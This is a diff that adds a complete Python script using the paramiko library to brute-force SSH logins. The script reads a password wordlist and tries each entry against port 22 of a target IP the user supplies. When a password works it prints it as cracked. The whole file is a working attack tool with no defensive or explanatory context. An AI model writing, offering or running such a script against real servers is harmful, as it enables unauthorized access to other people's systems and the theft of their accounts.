@@ -1,0 +1,46 @@
+import paramiko
+import time
+import os
+
+def ssh_bruteforce(target_ip, username, password_file):
+    if not os.path.isfile(password_file):
+        print(f"[X] Error: Password file '{password_file}' not found.")
+        return None
+
+    with open(password_file, "r") as file:
+        passwords = file.readlines()
+
+    for password in passwords:
+        password = password.strip()
+        print(f"[+] Trying password: {password}")
+
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(target_ip, port=22, username=username, password=password, timeout=3)
+
+            print(f"[!] SUCCESS: Logged in as {username} with password {password}")
+            ssh.close()
+            return password  # Stop if successful
+        except paramiko.AuthenticationException:
+            print(f"[-] Failed: {password}")
+        except paramiko.SSHException:
+            print("[X] Connection error, retrying after 5 seconds...")
+            time.sleep(5)
+        except Exception as e:
+            print(f"[ERROR] {str(e)}")
+
+    print("[X] Brute force failed. No valid credentials found.")
+    return None
+
+if __name__ == "__main__":
+    target_ip = input("Enter the target SSH server IP: ").strip()
+    username = input("Enter the SSH username: ").strip()
+    wordlist_path = input("Enter the path to the password wordlist: ").strip()
+
+    found_password = ssh_bruteforce(target_ip, username, wordlist_path)
+    if found_password:
+        print(f"[+] Successfully cracked SSH password: {found_password}")
+    else:
+        print("[-] No valid password found.")
+                                                                                
